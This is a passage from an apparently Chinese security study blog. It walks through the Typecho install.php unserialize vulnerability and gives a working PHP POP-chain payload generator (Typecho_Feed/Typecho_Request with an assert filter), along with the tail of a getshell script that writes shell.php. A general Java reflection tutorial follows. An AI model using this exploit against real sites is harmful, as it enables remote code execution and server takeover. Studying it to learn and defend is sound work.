:&quot;,url+&quot;shell.php&quot;) </span><br><span class=\"line\">else: </span><br><span class=\"line\">\tprint(&quot;[-] GetShell Error!&quot;)</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221125151707169.png\" alt=\"image-20221125151707169\" style=\"zoom: 67%;\" />1</p>\n<p>漏洞分析：</p>\n<p>1.install.php</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221125153310059.png\" alt=\"image-20221125153310059\"></p>\n<p>这里需要传入一个 finish 参数，然后在 230 行将 cookie 中的__typecho_config 的值通过 base64 解码之后反序列化。</p>\n<p>而__typecho_config 是通过 cookie 传入的，在 install.php 中 528 行，set __typecho_config，并且将其序列化后 base64 编码</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221125153401994.png\" alt=\"image-20221125153401994\"></p>\n<p>在 cookie.php 中，set 的定义：</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221125153457221.png\" alt=\"image-20221125153457221\"></p>\n<p>2.install.php</p>\n<p>再往下看两行到 232 行，这里将<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>c</mi><mi>o</mi><mi>n</mi><mi>f</mi><mi>i</mi><mi>g</mi><msup><mo stretchy=\"false\">[</mo><mo mathvariant=\"normal\" lspace=\"0em\" rspace=\"0em\">′</mo></msup><mi>a</mi><mi>d</mi><mi>a</mi><mi>p</mi><mi>t</mi><mi>e</mi><msup><mi>r</mi><mo mathvariant=\"normal\" lspace=\"0em\" rspace=\"0em\">′</mo></msup><mo stretchy=\"false\">]</mo><mtext>作为第一个参数传入到</mtext><mi>T</mi><mi>y</mi><mi>p</mi><mi>e</mi><mi>c</mi><mi>h</mi><msub><mi>o</mi><mi>D</mi></msub><mi>b</mi><mo stretchy=\"false\">(</mo><mo stretchy=\"false\">)</mo><mtext>中。</mtext></mrow><annotation encoding=\"application/x-tex\">config[&#x27;adapter&#x27;]作为第一个参数传入到Typecho_Db()中。</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:1.001892em;vertical-align:-0.25em;\"></span><span class=\"mord mathnormal\">c</span><span class=\"mord mathnormal\">o</span><span class=\"mord mathnormal\">n</span><span class=\"mord mathnormal\" style=\"margin-right:0.10764em;\">f</span><span class=\"mord mathnormal\">i</span><span class=\"mord mathnormal\" style=\"margin-right:0.03588em;\">g</span><span class=\"mopen\"><span class=\"mopen\">[</span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.751892em;\"><span style=\"top:-3.063em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">′</span></span></span></span></span></span></span></span></span><span class=\"mord mathnormal\">a</span><span class=\"mord mathnormal\">d</span><span class=\"mord mathnormal\">a</span><span class=\"mord mathnormal\">p</span><span class=\"mord mathnormal\">t</span><span class=\"mord mathnormal\">e</span><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.02778em;\">r</span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.751892em;\"><span style=\"top:-3.063em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">′</span></span></span></span></span></span></span></span></span><span class=\"mclose\">]</span><span class=\"mord cjk_fallback\">作</span><span class=\"mord cjk_fallback\">为</span><span class=\"mord cjk_fallback\">第</span><span class=\"mord cjk_fallback\">一</span><span class=\"mord cjk_fallback\">个</span><span class=\"mord cjk_fallback\">参</span><span class=\"mord cjk_fallback\">数</span><span class=\"mord cjk_fallback\">传</span><span class=\"mord cjk_fallback\">入</span><span class=\"mord cjk_fallback\">到</span><span class=\"mord mathnormal\" style=\"margin-right:0.13889em;\">T</span><span class=\"mord mathnormal\" style=\"margin-right:0.03588em;\">y</span><span class=\"mord mathnormal\">p</span><span class=\"mord mathnormal\">e</span><span class=\"mord mathnormal\">c</span><span class=\"mord mathnormal\">h</span><span class=\"mord\"><span class=\"mord mathnormal\">o</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.32833099999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mathnormal mtight\" style=\"margin-right:0.02778em;\">D</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mord mathnormal\">b</span><span class=\"mopen\">(</span><span class=\"mclose\">)</span><span class=\"mord cjk_fallback\">中</span><span class=\"mord cjk_fallback\">。</span></span></span></span>config 就是反序列化传来的对象，因此这个参数也是我们可控的。</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221125153932537.png\" alt=\"image-20221125153932537\"></p>\n<p>3.Db.php</p>\n<p>跟进 Typecho_DB，构造函数中将’Typecho_Db_Adapter_’ 和 $adapterName 做了拼接</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221125154054082.png\" alt=\"image-20221125154054082\"></p>\n<p>只要 $adapterName 是一个对象，那么这里就会调用其__toString () 方法。刚好，第一个参数是我们可控的。</p>\n<p>4.feed.php</p>\n<p>在 feed.php 中有 to_String 方法，to_String 方法中有如下</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221125154328760.png\" alt=\"image-20221125154328760\"></p>\n<p>如果我们传入的 author 没有 screennaame 属性，那么就会调用__get () 方法。刚好，这里的 $item 是我们可控的。因此下面就找哪些类没有 screenName 属性，并且__get 方法存在危险操作。</p>\n<p>5.Request.php</p>\n<p>Typecho_Request 类中存在__get 方法</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221125154931232.png\" alt=\"image-20221125154931232\"></p>\n<p>__get 会调用 get，<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>t</mi><mi>h</mi><mi>i</mi><mi>s</mi><mo>−</mo><msub><mo>&gt;</mo><mi>p</mi></msub><mi>a</mi><mi>r</mi><mi>a</mi><mi>m</mi><mi>s</mi><mtext>也可控，而</mtext></mrow><annotation encoding=\"application/x-tex\">this-&gt; _params也可控，而</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.980548em;vertical-align:-0.286108em;\"></span><span class=\"mord mathnormal\">t</span><span class=\"mord mathnormal\">h</span><span class=\"mord mathnormal\">i</span><span class=\"mord mathnormal\">s</span><span class=\"mord\">−</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\"><span class=\"mrel\">&gt;</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15139200000000003em;\"><span style=\"top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mathnormal mtight\">p</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.286108em;\"><span></span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.68333em;vertical-align:0em;\"></span><span class=\"mord mathnormal\">a</span><span class=\"mord mathnormal\" style=\"margin-right:0.02778em;\">r</span><span class=\"mord mathnormal\">a</span><span class=\"mord mathnormal\">m</span><span class=\"mord mathnormal\">s</span><span class=\"mord cjk_fallback\">也</span><span class=\"mord cjk_fallback\">可</span><span class=\"mord cjk_fallback\">控</span><span class=\"mord cjk_fallback\">，</span><span class=\"mord cjk_fallback\">而</span></span></span></span> key 正是 screenName，因此 $value 可控</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221125155023667.png\" alt=\"image-20221125155023667\"></p>\n<p>get 调用_applyFilter</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221125155050806.png\" alt=\"image-20221125155050806\"></p>\n<p>可以看到，这里有个 call_user_func 方法，且<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>f</mi><mi>i</mi><mi>l</mi><mi>t</mi><mi>e</mi><mi>r</mi><mtext>和</mtext></mrow><annotation encoding=\"application/x-tex\">filter和</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.8888799999999999em;vertical-align:-0.19444em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.10764em;\">f</span><span class=\"mord mathnormal\">i</span><span class=\"mord mathnormal\" style=\"margin-right:0.01968em;\">l</span><span class=\"mord mathnormal\">t</span><span class=\"mord mathnormal\">e</span><span class=\"mord mathnormal\" style=\"margin-right:0.02778em;\">r</span><span class=\"mord cjk_fallback\">和</span></span></span></span> value 都可控。至此这条 pop 链基本是构造完了。</p>\n<p>最后重新分析一下 payload</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\"></span><br><span class=\"line\">\tclass Typecho_Feed&#123;</span><br><span class=\"line\">\t\tprivate $_type;</span><br><span class=\"line\">\t\tprivate $_items = array();</span><br><span class=\"line\"></span><br><span class=\"line\">\t\tpublic function __construct()&#123;</span><br><span class=\"line\">\t\t\t$this-&gt;_type = &quot;RSS 2.0&quot;;   //因为feed.php中else if (self::RSS2 == $this-&gt;_type)必须为RSS2.0时才能进入elseif</span><br><span class=\"line\">\t\t\t$this-&gt;_items = array(      //一次从item中循环每一个属性</span><br><span class=\"line\">\t\t\t\tarray(</span><br><span class=\"line\">\t\t\t\t\t&quot;title&quot; =&gt; &quot;test&quot;,</span><br><span class=\"line\">\t\t\t\t\t&quot;link&quot; =&gt; &quot;test&quot;,</span><br><span class=\"line\">\t\t\t\t\t&quot;data&quot; =&gt; &quot;20190430&quot;,</span><br><span class=\"line\">\t\t\t\t\t&quot;author&quot; =&gt; new Typecho_Request(),   //前三个乱传，最后一个author传入Typecho_Request,因为里面没有screenName属性</span><br><span class=\"line\">\t\t\t\t),</span><br><span class=\"line\">\t\t\t);</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\tclass Typecho_Request&#123;</span><br><span class=\"line\">\t\tprivate $_params = array();</span><br><span class=\"line\">\t\tprivate $_filter = array();</span><br><span class=\"line\"></span><br><span class=\"line\">\t\tpublic function __construct()&#123;</span><br><span class=\"line\">\t\t\t$this-&gt;_params = array(</span><br><span class=\"line\">\t\t\t\t&quot;screenName&quot; =&gt; &quot;eval(&#x27;phpinfo();exit;&#x27;)&quot;,</span><br><span class=\"line\">\t\t\t);</span><br><span class=\"line\">\t\t\t$this-&gt;_filter = array(&quot;assert&quot;);          //call_user_func($filter, $value);</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\t$a = new Typecho_Feed();</span><br><span class=\"line\"></span><br><span class=\"line\">\t$c = array(</span><br><span class=\"line\">\t\t&quot;adapter&quot; =&gt; $a,</span><br><span class=\"line\">\t\t&quot;prefix&quot; =&gt; &quot;test&quot;,               //$adapterName = &#x27;Typecho_Db_Adapter_&#x27; . $adapterName;s</span><br><span class=\"line\">\t);</span><br><span class=\"line\"></span><br><span class=\"line\">\techo base64_encode(serialize($c));</span><br></pre></td></tr></table></figure>\n<p>传入上面的 payload 后，被反序列化，恶意代码执行</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vbGl0bGlmZS9wLzEwNzk4MDYxLmh0bWw=\">Typecho - 反序列化漏洞学习 - ka1n4t - 博客园 (cnblogs.com)</span></p>\n<h2 id=\"2java\"><a class=\"markdownIt-Anchor\" href=\"#2java\">#</a> 2.java</h2>\n<h3 id=\"反射\"><a class=\"markdownIt-Anchor\" href=\"#反射\">#</a> 反射</h3>\n<p>Java 的反射是指程序在运行期可以拿到一个对象的所有信息。</p>\n<p>所以，反射是为了解决在运行期，对某个实例一无所知的情况下，如何调用其方法。</p>\n<p>这种通过 <code>Class</code>  实例获取 <code>class</code>  信息的方法称为反射（Reflection）。</p>\n<p>如何获取一个 <code>class</code>  的 <code>Class</code>  实例？有三个方法：</p>\n<p>方法一：直接通过一个 <code>class</code>  的静态变量 <code>class</code>  获取：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Class cls = String.class;</span><br></pre></td></tr></table></figure>\n<p>方法二：如果我们有一个实例变量，可以通过该实例变量提供的 <code>getClass()</code>  方法获取：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">String s = &quot;Hello&quot;;</span><br><span class=\"line\">Class cls = s.getClass();</span><br></pre></td></tr></table></figure>\n<p>方法三：如果知道一个 <code>class</code>  的完整类名，可以通过静态方法 <code>Class.forName()</code>  获取：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Class cls = Class.forName(&quot;java.lang.String&quot;);</span><br></pre></td></tr></table></figure>\n<p><code>Class</code>  类提供了以下几个方法来获取字段：</p>\n<ul>\n<li>Field getField (name)：根据字段名获取某个 public 的 field（包括父类）</li>\n<li>Field getDeclaredField (name)：根据字段名获取当前类的某个 field（不包括父类）</li>\n<li>Field [] getFields ()：获取所有 public 的 field（包括父类）</li>\n<li>Field [] getDeclaredFields ()：获取当前类的所有 field（不包括父类）</li>\n</ul>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">Main</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title function_\">main</span><span class=\"params\">(String[] args)</span> <span class=\"keyword\">throws</span> Exception &#123;</span><br><span class=\"line\">        <span class=\"type\">Class</span> <span class=\"variable\">stdClass</span> <span class=\"operator\">=</span> Student.class;</span><br><span class=\"line\">        <span class=\"comment\">// 获取public字段&quot;score&quot;:</span></span><br><span class=\"line\">        System.out.println(stdClass.getField(<span class=\"string\">&quot;score&quot;</span>));</span><br><span class=\"line\">        <span class=\"comment\">// 获取继承的public字段&quot;name&quot;:</span></span><br><span class=\"line\">        System.out.println(stdClass.getField(<span class=\"string\">&quot;name&quot;</span>));</span><br><span class=\"line\">        <span class=\"comment\">// 获取private字段&quot;grade&quot;:</span></span><br><span class=\"line\">        System.out.println(stdClass.getDeclaredField(<span class=\"string\">&quot;grade&quot;</span>));</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">Student</span> <span class=\"keyword\">extends</span> <span class=\"title class_\">Person</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"type\">int</span> score;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"type\">int</span> grade;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">Person</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> String name;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>一个 <code>Field</code>  对象包含了一个字段的所有信息：</p>\n<ul>\n<li><code>getName()</code> ：返回字段名称，例如， <code>&quot;name&quot;</code> ；</li>\n<li><code>getType()</code> ：返回字段类型，也是一个 <code>Class</code>  实例，例如， <code>String.class</code> ；</li>\n<li><code>getModifiers()</code> ：返回字段的修饰符，它是一个 <code>int</code> ，不同的 bit 表示不同的含义。</li>\n</ul>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">Field</span> <span class=\"variable\">f</span> <span class=\"operator\">=</span> String.class.getDeclaredField(<span class=\"string\">&quot;value&quot;</span>);</span><br><span class=\"line\">f.getName(); <span class=\"comment\">// &quot;value&quot;</span></span><br><span class=\"line\">f.getType(); <span class=\"comment\">// class [B 表示byte[]类型</span></span><br><span class=\"line\"><span class=\"type\">int</span> <span class=\"variable\">m</span> <span class=\"operator\">=</span> f.getModifiers();</span><br><span class=\"line\">Modifier.isFinal(m); <span class=\"comment\">// true</span></span><br><span class=\"line\">Modifier.isPublic(m); <span class=\"comment\">// false</span></span><br><span class=\"line\">Modifier.isProtected(m); <span class=\"comment\">// false</span></span><br><span class=\"line\">Modifier.isPrivate(m); <span class=\"comment\">// true</span></span><br><span class=\"line\">Modifier.isStatic(m); <span class=\"comment\">// false</span></span><br></pre></td></tr></table></figure>\n<p>拿到字段值</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">Main</span> &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title function_\">main</span><span class=\"params\">(String[] args)</span> <span class=\"keyword\">throws</span> Exception &#123;</span><br><span class=\"line\">        <span class=\"type\">Object</span> <span class=\"variable\">p</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">Person</span>(<span class=\"string\">&quot;Xiao Ming&quot;</span>);</span><br><span class=\"line\">        <span class=\"type\">Class</span> <span class=\"variable\">c</span> <span class=\"operator\">=</span> p.getClass();</span><br><span class=\"line\">        <span class=\"type\">Field</span> <span class=\"variable\">f</span> <span class=\"operator\">=</span> c.getDeclaredField(<span class=\"string\">&quot;name&quot;</span>);</span><br><span class=\"line\">        <span class=\"type\">Object</span> <span class=\"variable\">value</span> <span class=\"operator\">=</span> f.get(p);</span><br><span class=\"line\">        System.out.println(value); <span class=\"comment\">// &quot;Xiao Ming&quot;</span></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">Person</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> String name;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"title function_\">Person</span><span class=\"params\">(String name)</span> &#123;</span><br><span class=\"line\">        <span class=\"built_in\">this</span>.name = name;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>正常情况下， <code>Main</code>  类无法访问 <code>Person</code>  类的 <code>private</code>  字段。要修复错误，可以将 <code>private</code>  改为 <code>public</code> ，或者，在调用 <code>Object value = f.get(p);</code>  前，先写一句：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">f.setAccessible(true);</span><br></pre></td></tr></table></figure>\n<p>调用 <code>Field.setAccessible(true)</code>  的意思是，别管这个字段是不是 <code>public</code> ，一律允许访问。</p>\n<p><code>f.set(p, &quot;Xiao Hong&quot;);</code>  修改字段值</p>\n<p>同样的，可以通过 <code>Class</code>  实例获取所有 <code>Method</code>  信息。 <code>Class</code>  类提供了以下几个方法来获取 <code>Method</code> ：</p>\n<ul>\n<li><code>Method getMethod(name, Class...)</code> ：获取某个 <code>public</code>  的 <code>Method</code> （包括父类）</li>\n<li><code>Method getDeclaredMethod(name, Class...)</code> ：获取当前类的某个 <code>Method</code> （不包括父类）</li>\n<li><code>Method[] getMethods()</code> ：获取所有 <code>public</code>  的 <code>Method</code> （包括父类）</li>\n<li><code>Method[] getDeclaredMethods()</code> ：获取当前类的所有 <code>Method</code> （不包括父类）</li>\n</ul>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title function_\">main</span><span class=\"params\">(String[] args)</span> <span class=\"keyword\">throws</span> Exception &#123;</span><br><span class=\"line\">    <span class=\"type\">Class</span> <span class=\"variable\">stdClass</span> <span class=\"operator\">=</span> Student.class;</span><br><span class=\"line\">    <span class=\"comment\">// 获取public方法getScore，参数为String:</span></span><br><span class=\"line\">    System.out.println(stdClass.getMethod(<span class=\"string\">&quot;getScore&quot;</span>, String.class));</span><br><span class=\"line\">    <span class=\"comment\">// 获取继承的public方法getName，无参数:</span></span><br><span class=\"line\">    System.out.println(stdClass.getMethod(<span class=\"string\">&quot;getName&quot;</span>));</span><br><span class=\"line\">    <span class=\"comment\">// 获取private方法getGrade，参数为int:</span></span><br><span class=\"line\">    System.out.println(stdClass.getDeclaredMethod(<span class=\"string\">&quot;getGrade&quot;</span>, <span class=\"type\">int</span>.class));</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p><strong>调用方法</strong>。如果用反射来调用 <code>substring</code>  方法</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">Main</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title function_\">main</span><span class=\"params\">(String[] args)</span> <span class=\"keyword\">throws</span> Exception &#123;</span><br><span class=\"line\">        <span class=\"comment\">// String对象:</span></span><br><span class=\"line\">        <span class=\"type\">String</span> <span class=\"variable\">s</span> <span class=\"operator\">=</span> <span class=\"string\">&quot;Hello world&quot;</span>;</span><br><span class=\"line\">        <span class=\"comment\">// 获取String substring(int)方法，参数为int:</span></span><br><span class=\"line\">        <span class=\"type\">Method</span> <span class=\"variable\">m</span> <span class=\"operator\">=</span> String.class.getMethod(<span class=\"string\">&quot;substring&quot;</span>, <span class=\"type\">int</span>.class);</span><br><span class=\"line\">        <span class=\"comment\">// 在s对象上调用该方法并获取结果:</span></span><br><span class=\"line\">        <span class=\"type\">String</span> <span class=\"variable\">r</span> <span class=\"operator\">=</span> (String) m.invoke(s, <span class=\"number\">6</span>);</span><br><span class=\"line\">        <span class=\"comment\">// 打印调用结果:</span></span><br><span class=\"line\">        System.out.println(r);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>调用静态方法</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">Main</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title function_\">main</span><span class=\"params\">(String[] args)</span> <span class=\"keyword\">throws</span> Exception &#123;</span><br><span class=\"line\">        <span class=\"comment\">// 获取Integer.parseInt(String)方法，参数为String:</span></span><br><span class=\"line\">        <span class=\"type\">Method</span> <span class=\"variable\">m</span> <span class=\"operator\">=</span> Integer.class.getMethod(<span class=\"string\">&quot;parseInt&quot;</span>, String.class);</span><br><span class=\"line\">        <span class=\"comment\">// 调用该静态方法并获取结果:</span></span><br><span class=\"line\">        <span class=\"type\">Integer</span> <span class=\"variable\">n</span> <span class=\"operator\">=</span> (Integer) m.invoke(<span class=\"literal\">null</span>, <span class=\"string\">&quot;12345&quot;</span>);</span><br><span class=\"line\">        <span class=\"comment\">// 打印调用结果:</span></span><br><span class=\"line\">        System.out.println(n);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>调用非 public 方法</p>\n<p><code> m.setAccessible(true);</code></p>\n<p>多态：调用子类和父类都存在该方法时，调用子类方法</p>\n<p>如果通过反射来创建新的实例，可以调用 Class 提供的 newInstance () 方法：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Person p = Person.class.newInstance();</span><br></pre></td></tr></table></figure>\n<p>它只能调用该类的 public 无参数构造方法。如果构造方法带有参数，或者不是 public，就无法直接通过 Class.newInstance () 来调用。</p>\n<p>获取有参方法</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">Main</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title function_\">main</span><span class=\"params\">(String[] args)</span> <span class=\"keyword\">throws</span> Exception 